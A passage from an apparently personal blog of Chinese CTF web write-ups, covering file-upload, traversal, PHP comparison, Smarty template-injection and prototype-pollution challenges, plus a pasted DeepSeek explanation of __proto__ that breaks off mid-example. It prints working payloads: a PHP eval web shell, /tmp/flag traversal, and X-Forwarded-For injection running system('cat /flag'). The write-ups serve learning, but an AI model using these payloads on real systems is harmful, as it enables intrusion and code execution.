class="hljs-punctuation">: </span>127.0.0.1:13280<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>209<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryJHC9baVxiUBdxw4G<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:13280/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G</span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;image&quot;</span>; filename=<span class="hljs-string">&quot;shell.php&quot;</span></span><br><span class="language-php">Content-Type: image/png</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[shell]);</span><br><span class="language-php">------WebKitFormBoundaryJHC9baVxiUBdxw4G--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><p>传完后蚂蚁直接连<br>同样查看环境拿到flag  </p><h1 id="MoeCTF-垫刀之路04-一个文件浏览器"><a href="#MoeCTF-垫刀之路04-一个文件浏览器" class="headerlink" title="MoeCTF 垫刀之路04: 一个文件浏览器"></a>MoeCTF 垫刀之路04: 一个文件浏览器</h1><p>java站点，直接在url就能目录穿越，然后就是手工找flag。。。<br>flag目录：<br>?path&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;tmp&#x2F;flag  </p><h1 id="MoeCTF-ProveYourLove"><a href="#MoeCTF-ProveYourLove" class="headerlink" title="MoeCTF ProveYourLove"></a>MoeCTF ProveYourLove</h1><p>根据题目提示传够 300次就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>data = &#123;<span class="hljs-string">&quot;nickname&quot;</span>:<span class="hljs-string">&quot;mignon&quot;</span>,<span class="hljs-string">&quot;user_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;target&quot;</span>:<span class="hljs-string">&quot;nm&quot;</span>,<span class="hljs-string">&quot;target_gender&quot;</span>:<span class="hljs-string">&quot;male&quot;</span>,<span class="hljs-string">&quot;message&quot;</span>:<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;anonymous&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>&#125;<br>url = <span class="hljs-string">&#x27;http://127.0.0.1:42701/questionnaire&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">300</span>):<br>    qq = requests.post(url,json=data)<br>    <span class="hljs-built_in">print</span>(qq.text)<br></code></pre></td></tr></table></figure><h1 id="Moe-CTF-静态网页"><a href="#Moe-CTF-静态网页" class="headerlink" title="Moe CTF 静态网页"></a>Moe CTF 静态网页</h1><p>点击看板娘，会在bp看到发包并且有个传参，在浏览器访问并且改id&#x3D;1<br>在最下面看到final1l1l_challenge.php<br>直接访问<br>得到  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;final1l1l_challenge.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$b</span>)) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$a</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$b</span>)) &#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-variable">$b</span>[<span class="hljs-variable">$a</span>]) &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;noooooooooooo&#x27;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Notice the param type!&#x27;</span>);<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;Where is your param?&#x27;</span>);<br>&#125; Where is your param?<br></code></pre></td></tr></table></figure><p>要求 a和b都不是数字<br>a等于0，并且a的md5值等于b的数组的a?<br>有点乱  </p><p>这个绕不过，看到网上有两种解法  </p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">1</span>:<br>意思是让我们<span class="hljs-built_in">get</span>输入<span class="hljs-keyword">a</span>，<span class="hljs-built_in">post</span>输入b，且两个变量都不是数字，然后<span class="hljs-keyword">a</span>弱相等等于<span class="hljs-number">0</span>，md5($<span class="hljs-keyword">a</span>)和b的第$<span class="hljs-keyword">a</span>个元素弱相等，那其实只要<span class="hljs-keyword">a</span>第一位数字是字母，md5($<span class="hljs-keyword">a</span>)为经典<span class="hljs-number">0</span>e开头数字，b随便取个<span class="hljs-number">0</span>k就行，构造?<span class="hljs-keyword">a</span>=QNKCDZO,<span class="hljs-built_in">post</span>输入b=<span class="hljs-number">0</span>k就可以了。得到flag。<br><br>出题人自己的解法：<br>后半部分要求是 md5($<span class="hljs-keyword">a</span>) == $b[$<span class="hljs-keyword">a</span>]，有的师傅可能认为这是 md5 绕过，并且说绕不过去。其实只要静下来定睛一看就能看出来，这个表达式其实并没有对 <span class="hljs-keyword">a</span> 参数做出任何限制，全是对 b 的限制。所以细看就能知道，我们要求的是 b[<span class="hljs-keyword">a</span>] 就是 <span class="hljs-keyword">a</span> 的 md5 值。至于如何赋值，请看下文：<br><br>GET: ?<span class="hljs-keyword">a</span>=<span class="hljs-number">0</span><span class="hljs-keyword">a</span><br>POST:<br>b[<span class="hljs-number">0</span><span class="hljs-keyword">a</span>]=e99bb33727d338314912e86fbdec87af<br><br>可以看到，想要传数组，直接把 <span class="hljs-keyword">a</span> 的值丢进中括号就行了。b 的值就是 <span class="hljs-number">0</span><span class="hljs-keyword">a</span> 的 md5 值。<br></code></pre></td></tr></table></figure><p>按照出题的说法试了一下<br>a&#x3D;0b<br>b[0b]&#x3D;347017fd1e37a22faf91875981bc4fb3<br>确实可以了<br>原来还可以这样传数组啊  </p><h1 id="2019-强网杯-高明的黑客"><a href="#2019-强网杯-高明的黑客" class="headerlink" title="2019 强网杯 高明的黑客"></a>2019 强网杯 高明的黑客</h1><p>下源码看了一眼吓哭了，几千个php文件<br>网上的wp说是用脚本来测试每个php文件里留下的马能否用<br>没做，记一下思路  </p><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>打开题目发现有flag一栏，点开发现会显示<br>Your IP is : 192.168.122.15<br>bp抓爆就知道了  </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Referer</span>: http://node5.buuoj.cn:<span class="hljs-number">25798</span>/index.php<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><br></code></pre></td></tr></table></figure><p>明明是正常的请求头啊  </p><p>打开hint看看，里面有说：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Do you know why i know your ip? --&gt;</span><br></code></pre></td></tr></table></figure><p>想到了是要添加ip，但是忘了该怎么自定义请求ip<br>上网搜<br>是<br>X-Forwarded-For:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /flag.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: node5.buuoj.cn:<span class="hljs-number">25798</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">111.111.111.111</span><br></code></pre></td></tr></table></figure><p>成功回显指定ip<br>不知道为什么传了一次;就再也不能指定ip来回显了  </p><p>算了看wp吧<br>看了半天竟然是模板注入  </p><p>传了一次传了一次;就再也不能指定ip来回显了<br>这个问题用bp的添加请求头来解决<br>照着wp做就行</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is :</span><br><span class="language-xml">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template &quot;string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; on line 1 &quot;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">ls</span>&#125;&#125;</span><span class="language-xml">&quot; unknown tag &#x27;ls&#x27; &lt;-- thrown in /var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php on line 1</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bootstrap</span><br><span class="language-xml">css</span><br><span class="language-xml">flag.php</span><br><span class="language-xml">header.php</span><br><span class="language-xml">hint.php</span><br><span class="language-xml">img</span><br><span class="language-xml">index.php</span><br><span class="language-xml">jquery</span><br><span class="language-xml">libs</span><br><span class="language-xml">templates_c</span><br><span class="language-xml">templates_c</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Fatal error<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Uncaught  --<span class="hljs-symbol">&amp;gt;</span> Smarty Compiler: Syntax error in template <span class="hljs-symbol">&amp;quot;</span>string:</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  on line 1 <span class="hljs-symbol">&amp;quot;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">ls</span> /)&#125;&#125;</span><span class="language-xml"><span class="hljs-symbol">&amp;quot;</span>  - Unexpected <span class="hljs-symbol">&amp;quot;</span>)<span class="hljs-symbol">&amp;quot;</span> <span class="hljs-symbol">&amp;lt;</span>-- </span><br><span class="language-xml">thrown in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/libs/sysplugins/smarty_internal_templatecompilerbase.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>1</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">Your IP is : bin</span><br><span class="language-xml">dev</span><br><span class="language-xml">etc</span><br><span class="language-xml">flag</span><br><span class="language-xml">home</span><br><span class="language-xml">lib</span><br><span class="language-xml">media</span><br><span class="language-xml">mnt</span><br><span class="language-xml">opt</span><br><span class="language-xml">proc</span><br><span class="language-xml">root</span><br><span class="language-xml">run</span><br><span class="language-xml">sbin</span><br><span class="language-xml">srv</span><br><span class="language-xml">sys</span><br><span class="language-xml">tmp</span><br><span class="language-xml">usr</span><br><span class="language-xml">var</span><br><span class="language-xml">var</span><br><span class="language-xml"></span><br><span class="language-xml">X-Forwarded-For: </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//拿到flag</span><br></code></pre></td></tr></table></figure><p>Flask可能存在Jinjia2模版注入漏洞<br>PHP可能存在Twig模版注入漏洞<br>源wp<br><a href="https://blog.csdn.net/weixin_44037296/article/details/111410565">https://blog.csdn.net/weixin_44037296/article/details/111410565</a></p><hr><h2 id="title-note-35date-2025-05-14-18-04-40tags-web"><a href="#title-note-35date-2025-05-14-18-04-40tags-web" class="headerlink" title="title: note-35date: 2025-05-14 18:04:40tags: web"></a>title: note-35<br>date: 2025-05-14 18:04:40<br>tags: web</h2><h1 id="Mini-L-CTF-Click-and-Click"><a href="#Mini-L-CTF-Click-and-Click" class="headerlink" title="Mini L-CTF Click and Click"></a>Mini L-CTF Click and Click</h1><p>当初没做出来，去西电CTF平台复现<br>官方wp：<br>先用JavaScript在浏览器控制台刷够10000  </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">but = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">&quot;#app &gt; main &gt; div &gt; button&quot;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) &#123;<br>    but.<span class="hljs-title function_">click</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>在bp上看到 http 历史记录<br>发现是没50次发一次包<br>过了1000次后服务器一直回显“按的太快了”<br>回显内容：  </p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs d">什么叫“前后端分离”啊？（战术后仰）<br><br><span class="hljs-keyword">if</span> ( req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-number">0</span> || req.<span class="hljs-keyword">body</span>.point.amount == <span class="hljs-literal">null</span>) &#123; <span class="hljs-keyword">delete</span> req.<span class="hljs-keyword">body</span>.point.amount &#125;<br><br>条件判断：检查 req.<span class="hljs-keyword">body</span>.point.amount 的值是否是 <span class="hljs-number">0</span> 或 <span class="hljs-literal">null</span>。<br>操作：如果满足条件，删除 req.<span class="hljs-keyword">body</span>.point.amount 属性。<br></code></pre></td></tr></table></figure><p>官方的最终payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<br>  <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;set&quot;</span>,<br>  <span class="hljs-string">&quot;point&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">0</span>,<br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>      <span class="hljs-string">&quot;amount&quot;</span>: <span class="hljs-number">10000</span><br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>看官方wp思路，就是set amount为零，触发删除amount<br>此时因为amount已经被删除，当调用到point对象里的amount属性时会查询不到，<br>此时java的特性是会去查询他的父对象是否有amount这个属性，若是有，amount就会采用他父对象的值    </p><p>DeepSeek:这个__proto__ 是对象访问原型链的入口，通过它可以直接修改对象的“父对象”（原型）  </p><p>而我们通过设置__proto__的属性，给他添加一个amount属性，当java查询point的amount属性时因为被删除，所以就会去查询__proto__<br>此时若我们给了__proto__一个amount值，这时__proto__的amount值就会变成point的amount值，达到了绕过  </p><h2 id="与deepseek的对话"><a href="#与deepseek的对话" class="headerlink" title="与deepseek的对话"></a>与deepseek的对话</h2><h2 id="我的提问："><a href="#我的提问：" class="headerlink" title="我的提问："></a>我的提问：</h2><p>我对__proto__的作用不太理解，说明一下啊，我没接触过多少java</p><h2 id="AI回复："><a href="#AI回复：" class="headerlink" title="AI回复："></a>AI回复：</h2><p>已深度思考（用时 22 秒）</p><p>好的，用户之前一直在询问关于CTF题目中的原型链污染漏洞，特别是关于__proto__的作用。现在用户提到自己对__proto__的作用不太理解，并且提到没有接触过多少JavaScript，这说明用户可能是一个刚开始学习JavaScript的新手，或者在CTF中遇到了这个概念，但缺乏相关的背景知识。</p><p>首先，我需要确认用户的核心问题：理解__proto__在JavaScript中的作用，以及它如何导致原型链污染。用户之前的问题已经涉及到了原型链污染的攻击步骤，但可能对原型链本身的概念还不清楚，尤其是作为JavaScript的新手，需要从基础讲起。</p><p>接下来，我需要考虑如何用简单易懂的语言解释原型链和__proto__。用户可能对面向对象编程中的继承概念不太熟悉，或者对JavaScript的原型继承机制感到陌生。因此，需要用类比和具体的例子来帮助理解。</p><p>可能的步骤包括：</p><p>1. 解释JavaScript中的对象和原型链的基本概念。</p><p>2. 说明__proto__属性是什么，以及它如何指向对象的原型。</p><p>3. 演示如何通过修改__proto__来影响其他对象，进而导致原型链污染。</p><p>4. 结合之前的CTF题目，说明攻击者如何利用这一点。</p><p>需要注意的是，用户可能没有接触过构造函数或prototype属性，所以需要避免使用过于专业的术语，或者如果必须使用，要确保有足够的解释。同时，用户可能需要更多的实际例子来理解抽象的概念。</p><p>另外，用户之前的对话中提到“没接触过多少java”，这里可能存在笔误，用户可能指的是JavaScript，而不是Java。需要确认这一点，但在上下文中应该是JavaScript，因为讨论的是CTF中的JS漏洞。</p><p>在解释过程中，应避免使用复杂的代码示例，或者如果使用代码，要逐行解释其作用。同时，使用比喻或现实中的类比来帮助用户形成直观的理解，比如家族树、继承链等。</p><p>还需要强调为什么原型链污染是危险的，以及在实际开发中如何防止这种漏洞。这不仅能帮助用户理解攻击原理，还能增强他们的安全意识。</p><p>最后，总结关键点，确保用户能够抓住核心概念，并可能提供进一步的学习资源或练习建议，以巩固理解。</p><p>好的！我来用最简单的方式解释 <code>__proto__</code> 和原型链的概念，即使你完全没接触过 JavaScript 也能理解。我们从“对象”和“继承”这两个核心概念说起。</p><hr><h3 id="1-JavaScript中的对象"><a href="#1-JavaScript中的对象" class="headerlink" title="1. JavaScript中的对象"></a><strong>1. JavaScript中的对象</strong></h3><p>JavaScript 中几乎所有东西都是<strong>对象</strong>（比如数字、字符串、数组等都可以用对象的形式操作）。对象可以理解为一个“盒子”，里面装着<strong>属性</strong>（键值对）。例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// 一个简单的对象</span><br>    <span class="hljs-keyword">const</span> cat = &#123;<br>      <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;喵喵&quot;</span>,<br>      <span class="hljs-attr">age</span>: <span class="hljs-number">2</span>,<br>      <span class="hljs-attr">say</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;喵~&quot;</span>); &#125;<br>    &#125;;<br><br>这个 <span class="hljs-string">`cat`</span> 对象有属性 <span class="hljs-string">`name`</span>、<span class="hljs-string">`age`</span> 和方法 <span class="hljs-string">`say()`</span>。<br></code></pre></td></tr></table></figure><hr><h3 id="2-什么是原型链（Prototype-Chain）？"><a href="#2-什么是原型链（Prototype-Chain）？" class="headerlink" title="2. 什么是原型链（Prototype Chain）？"></a><strong>2. 什么是原型链（Prototype Chain）？</strong></h3><p>JavaScript 的继承机制是通过<strong>原型链</strong>实现的。简单来说：</p><ul><li><p><strong>每个对象都有一个“爸爸”（原型对象）</strong>。</p></li><li><p>如果访问一个对象的属性（比如 <code>cat.color</code>），但对象自己没有这个属性，JavaScript 会自动去它的“爸爸”对象里找。</p></li><li><p>如果“爸爸”也没有，就去“爷爷”对象里找……直到找到或者没有更高层的“祖先”（原型链顶端是 <code>null</code>）。</p></li></ul><p>这种<strong>链式查找机制</strong>就是原型链。</p><hr><h3 id="3-proto-的作用"><a href="#3-proto-的作用" class="headerlink" title="3. __proto__ 的作用"></a><strong>3. <code>__proto__</code> 的作用</strong></h3><p><code>__proto__</code> 是对象的一个<strong>隐藏属性</strong>（现在更推荐用 <code>Object.getPrototypeOf()</code> 获取），它直接指向对象的“爸爸”（原型对象）。</p><h4 id="举个例子："><a href="#举个例子：" class="headerlink" title="举个例子："></a><strong>举个例子：</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 创建一个对象</span><br><span class="hljs-keyword">const</span> animal = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;动物&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> cat = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;喵喵&quot;</span> &#125;;<br><br><span class="hljs-comment">// 手动设置 cat 的“爸爸”是 animal</span><br>cat.<span class="hljs-property">__proto__</span> = animal;<br><br><span class="hljs-comment">// 访问 cat.type</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">type</span>); <span class="hljs-comment">// 输出 &quot;动物&quot;（从“爸爸”animal继承）</span><br></code></pre></td></tr></table></figure><ul><li><p><code>cat</code> 自己没有 <code>type</code> 属性。</p></li><li><p>但因为 <code>cat.__proto__</code> 指向 <code>animal</code>，所以会去 <code>animal</code> 里找 <code>type</code>。</p></li><li><p>这就是<strong>继承</strong>！</p></li></ul><hr><h3 id="4-原型链污染的原理"><a href="#4-原型链污染的原理" class="headerlink" title="4. 原型链污染的原理"></a><strong>4. 原型链污染的原理</strong></h3><p>假设我们修改了一个对象的“爸爸”（原型对象），那么<strong>所有继承这个“爸爸”的对象都会受到影响</strong>！</p><h4 id="污染示例："><a href="#污染示例：" class="headerlink" title="污染示例："></a><strong>污染示例：</strong></h4><figure class="highlight 